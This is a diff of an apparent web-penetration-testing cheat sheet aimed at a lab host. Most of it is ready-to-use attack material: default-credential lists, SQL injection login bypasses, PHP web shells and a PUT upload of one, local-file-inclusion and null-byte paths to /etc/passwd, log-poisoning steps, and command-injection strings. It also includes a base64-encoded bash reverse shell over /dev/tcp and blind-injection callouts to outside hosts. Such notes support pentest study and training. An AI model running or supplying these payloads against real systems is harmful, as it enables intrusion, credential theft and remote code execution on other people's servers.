@@ -47,10 +47,8 @@ Follow links, paths
 Find clues, usernames, passwords, Login/Admin pages
 Login defaults/guessing 
 Burp - Can find secret redirects 
-Find Forms, Inputs, PHP, CGI 
-Forms/php = SQLi or WebInjections 
-Version of package (Wordpress, Drupal, Etc)
-
+Find Forms, Inputs, PHP, CGI, SQLi, Command Injections
+Version of package (Wordpress, Drupal, Etc) for Exploits
 
 =================================== 
 Browse 
@@ -73,15 +71,52 @@ curl -iL 192.168.200.5            ..redirects
 curl -iL http://192.168.200.5     ..bypass WAF
 curl -v –request OPTIONS http://  ..WebDAV Options
 
-Version/Creds/Comments
-curl http://192.168.200.5 | html2text | grep -i 'ver\|release\|build\|user\|pass\|comment' 
 
 =================================== 
 Checks
 
 ssl certificate - user/email/vhosts
-Cookie Manager - interesting
+Cookie Manager - Might have 'Admin'
 Wappalyzer - technology
+
+
+=================================== 
+Version Exploits 
+
+curl http://192.168.200.5 | html2text | grep -i 'ver\|release\|build\|\|user\|pass\|comment' 
+google 'coldfusion 8 exploits'
+searchsploit/exploitdb/blogs/github 
+Known: LFI - SQLi - Directory Traversal 
+EternalBlue/Shellshock/Heartbleed (Well-Known) 
+Remote Code Execution (RCE) 
+CRM/Wordpress= Vulns, Addon, Upload, Theme 
+
+
+=================================== 
+Admin/Logins
+
+admin admin
+admin password
+admin <blank>
+admin <servicename>
+<servicename> <servicename>
+root root
+root admin
+root password
+root <servicename>
+<username> password
+<username> admin
+<username> username
+username <servicename>
+(Google Default Password)
+
+=================================== 
+More Creds
+
+Reuse - If you found user/pass
+Hydra - Brute Force (if you have username) 
+Google - FileZilla Authentication Bypass
+Google - FileZilla SQLIi bypass
 
 
 =================================== 
@@ -91,9 +126,10 @@ Watch for path that looks like a file/folder
 File/Folders in Path  = Directory Traversal
 path/slash/files/../  = LocalFileInclusion 
 
-http://web/dept/manage.php?notes=files/comments.txt 
 http://web/menu.php?file=menu.php
+http://web/menu.php?file=./menu.php
 http://web/dept/?lang=/etc/passwd
+http://web/dept/manage.php?notes=files/comments.txt 
 http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
 http://web/dept/?lang=\\192.168.162.46\hello.txt   
 
@@ -101,29 +137,16 @@ LFI Scan:
 python fi-cyberscan.py -t http://192.168.200.5/cyber.php?page= -m1 
 fimap -u 192.168.200.5 
 
+
+=================================== 
+NULL bytes - Can help retrieve Files
+
+http://192.168.200.5/file.php?file=photo                 .. ok 
+http://192.168.200.5/file.php?file=photo.png             .. nothing 
+http://192.168.200.5/file.php?file=photo.png%00          .. ok 
+http://192.168.200.5/file.php?file=file.php%00           .. ok 
+http://192.168.200.5/file.php?file=/../../etc/passwd%00  .. win 
  
-=================================== 
-Admin/Logins
-
-Guess: admin:admin, root:root, administrator:password
-Google Default Password
-Reuse (if you've found user/pass) 
-MyApp Authentication Bypass (google) 
-MyApp SQLIi bypass (google) 
-Parameters in URL (might be SQLi)
-Brute with hydra (esp if you have username) 
-
-
-=================================== 
-Exploits 
-
-google 'coldfusion 8 exploits'
-searchsploit/exploitdb/blogs/github 
-Known: LFI - SQLi - Directory Traversal 
-EternalBlue/Shellshock/Heartbleed (Well-Known) 
-Remote Code Execution (RCE) 
-CRM/Wordpress= Vulns, Addon, Upload, Theme 
-
 
 =================================== 
 Inspect Page Content 
@@ -145,14 +168,92 @@ Firefox “Network” Tool (Tab)
 Web Developer > Network 
 Refresh page ..to see new traffic to the 'Contact' page 
 Click Contact.html 'get' request - Headers > Server Version! 
- 
-Weird Headers 
+
+=================================== 
+Headers 
+
 Non-standard Headers start with 'X-'
 X-Powered-By, x-amz-cf-id, X-Aspnet-Version 
 These names could reveal additional information for exploit 
 Ex: 'x-amz-cf-id' header = Application uses Amazon CloudFront 
- 
- 
+
+
+=================================== 
+Input fields - Interpreted or Scrubbed?
+
+'
+1+1
+aaaaaaaaaaaaaaaaa... 
+hello " ; < >
+ < > ' " { } ;  
+<script>alert();</script> 
+<ScRiPt>alert();</ScRiPt>  
+<?php echo('Hello World'); ?>
+<?php system($_GET["cmd"]); ?>  
+<?php echo system($_REQUEST ["cmd"]); ?> 
+(function(){ 
+   return 2+2; 
+})(); 
+
+
+=================================== 
+Login Bypass
+
+' OR 1=1 -- 
+" OR 1=1 --  
+' OR 1=1;# 
+" OR 1=1 #  
+' or 1=1; LIMIT 1;# 
+' or username LIKE '%admin% 
+admin' -- 
+
+USER: ' OR 1=1; /* 
+PASS: */-- 
+
+USER:  ' or 1/* 
+PASS:  */ =1 -- 
+
+USER: admin' or 1=1 # 
+PASS: admin' or 1=1 #  
+
+http://mongo.so/?username=admin' or 1=1--%00 
+http://mongo.so/?username=admin&password=admin&submit=Submit 
+http://mongo.so/?username=admin&password=admin&submit=Submit' or 1=1 -- 
+
+
+=================================== 
+User Creation Page
+
+You might be able to register with an odd pattern, but get admin prvis
+admin
+AdMiN 
+
+Before Creating a user.. Send to Burp
+Might find an Admin parameter
+
+
+=================================== 
+Name Field injection 
+
+Injecting the 'name' login field could give command injection 
+Custom messages aren't vulnerable to command injection, but your 'name' might be. 
+
+"\";whoami\n"
+"\" ;id\n"
+"\" ;/usr/bin/id\n"
+"\" \n/usr/bin/id\n"
+"\";ls -la\n"
+"\" \n/bin/ls -al\n"
+\n-- COW MASTER && WHOAMI  
+echo -e "hello\n-- COW MASTER && WHOAMI" | cowsay 
+echo -e "hola\n-- COW " && ECHO -E "ME"#" | cowsay 
+
+Reverse Shell
+bash -i >& /dev/tcp/<ip>/<port> 0>&1  (first convert base64)
+"\" \necho <base64> | base64 -d | bash\n"
+"\";echo YmFzaCAta4mMQo= | base64 -d | bash \n"
+
+
 =================================== 
 Brute
 
@@ -167,27 +268,152 @@ cewl 192.168.200.5 -m 4 -d 3 -w cewl6deep5.txt
 sort dict.txt | uniq > dict.txt  
 echo 'foundthis' >> dict.txt               
 echo 'hostname' >> dict.txt   
- 
+
 =================================== 
-SQL Injection 
+Upload Check
+
+curl -v -X OPTIONS http://192.168.200.5/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.200.5/test/shell.php
+
+
+=================================== 
+SQL Injection - Forms/Search/PHP/CMS
 
 ' 
 " 
 ; 
-admin' -- 
-' OR 1=1 -- 
-" OR 1=1 --  
-' OR 1=1;# 
-" OR 1=1 #  
 ',convert(int@@version))-- 
+' AND 1=2 UNION SELECT database(),user(),version() -- 
+' AND 1=2 UNION SELECT "/etc/passwd","b","c"--'  
+' UNION SELECT ("test") INTO OUTFILE 'C:/xampp/htdocs/test.php'  -- -'  
+
 
 =================================== 
 PHP SQLi Parameter
 
+Parameters in URL might be a finding
 View Page Source > Ctrl-F "?"  
 curl http://192.168.200.5 | html2text | grep -i '?' 
 http://192.168.200.5/room.php?cod=1'
-Error/no-graphic = perfect! 
+Error/no-graphic = We have injection
+
+
+=================================== 
+Cookies  
+
+Tools > Developer > Application > Cookies 
+Or Browser Extension  
+For yes-no or admin flags  
+For username (ex: auth=webuser) 
+Update to 'admin' to elevate! 
+
+MD5: 
+62318aca2ef2e809a13623715a8aaff4   ..testme 
+21232f297a57a5a743894a0e4a801fc3   ..admin 
+echo -ne admin | md5sum            ..ne prevents new-line-dump 
+
+Base64
+ZGVmYXVsdA%3D%3D
+ZGVmYXVsdA==
+echo ZGVmYXVsdA== | base64 -d      ..default 
+echo -n admin | base64
+YWRtaW4=                           ..admin
+
+=================================== 
+NULL bytes
+
+http://abc.so/file.php?file=photo                 .. ok 
+http://abc.so/file.php?file=photo.png             .. nothing 
+http://abc.so/file.php?file=photo.png%00          .. ok 
+http://abc.so/file.php?file=file.php%00           .. ok 
+http://abc.so/file.php?file=/../../etc/passwd%00  .. win 
+
+
+=================================== 
+Web Log Poison
+
+nc 192.168.200.5 80
+GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.200.5
+Connection: close
+
+curl http://192.168.200.5/menu.php?file=%2Fvar%2Flog%2Fhttpd-access.log&cmd=whoami 
+curl http://192.168.200.5/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+curl http://192.168.200.5/menu.php?page=../../../../../var/log/apache2/access.log&cmd=id
+
+=================================== 
+SSH Log Poison
+
+ssh "<?php phpinfo();?>"@192.168.200.5
+curl http://192.168.200.5/view.php?page=../../../../../var/log/auth.log
+
+
+=================================== 
+Bypass execution with base64 filter
+
+http://192.168.200.5/index.php?page=php://filter/convert.base64-encode/resource=index 
+base64 -d savefile.php
+
+
+=================================== 
+Injections
+
+http://192.168.200.5/?ip=127.0.0.1 
+http://192.168.200.5/?ip=127.0.0.1;pwd 
+http://192.168.200.5/?ip=127.0.0.1;uname 
+http://192.168.200.5/?ip=127.0.0.1;cat /etc/passwd 
+http://192.168.200.5/?ip=127.0.0.1;/usr/local/bin/score 
+http://192.168.200.5/?ip=127.0.0.1%26%26uname   ..&& 
+http://192.168.200.5/?ip=127||uname             ..fail and run 
+http://192.168.200.5/?ip=`uname`                ..back-ticks get priority 
+http://192.168.200.5/?ip=`/tmp/myApp`           ..my app 
+http://192.168.200.5/ping.php?cmd=192.168.162.46;python3%20-c%20%27import...
+ 
+More
+cmd;ping -c 1 192.168.162.46 
+cmd;ping -c 1 192.168.162.46;  
+cmd|ping -c 1 192.168.162.46  
+cmd`ping -c 1 192.168.162.46`  
+cmd`/usr/bin/ping -c 1 192.168.162.46`  
+cmd$(/usr/bin/ping -c 1 192.168.162.46)  
+
+cmd=ls&job=Run                            ..Original 
+cmd=ls -la&job=Run                        ..Updated 
+cmd=cat /etc/passwd&job=Run               ..new command 
+cmd=ls -la & cat /etc/passwd&job=Run      ..Combo 
+cmd=-o /path/test.html http://IP/test.html&Submit=Go ..switch(works w/curl) 
+
+Commands Blocked - Try $()
+http://192.168.200.5/?ip=`uname`                    ..error 
+http://192.168.200.5/?ip=$(uname)                   ..ok, but blind 
+http://192.168.200.5/?ip=$(curl https://me/hack)    ..watch logs to see if connect 
+http://192.168.200.5/?ip=$(ping hack.myserver)      ..watch dns for request 
+http://192.168.200.5/?ip=$(sleep 20)                ..took 20 sec - so it works! 
+http://192.168.200.5/?ip=$(/usr/local/bin/myApp)    ..blind! 
+
+Python Injections
+http://192.168.200.5/hack 
+http://192.168.200.5/hack"+"yes"+"
+http://192.168.200.5/hack"+str(__import__('os').system('id'))+"
+
+Perl
+http://192.168.200.5/cgi-bin/hello?name=hack 
+http://192.168.200.5/cgi-bin/hello?name=hack'.`uname -a`.' 
+
+Login Bypass
+http://mongo.so/?username=admin' or 1=1--%00 
+http://mongo.so/?username=admin&password=admin&submit=Submit 
+http://mongo.so/?username=admin&password=admin&submit=Submit' or 1=1 -- 
+
+=================================== 
+Common Web Roots (FYI)
+
+/var/www/ 
+/var/www/html/ 
+/srv/www/ 
+/home/public_html/ 
+/etc/apache2/       ..Apache/Debian 
+/etc/httpd/         ..CentOS 
 
 =================================== 
 Other
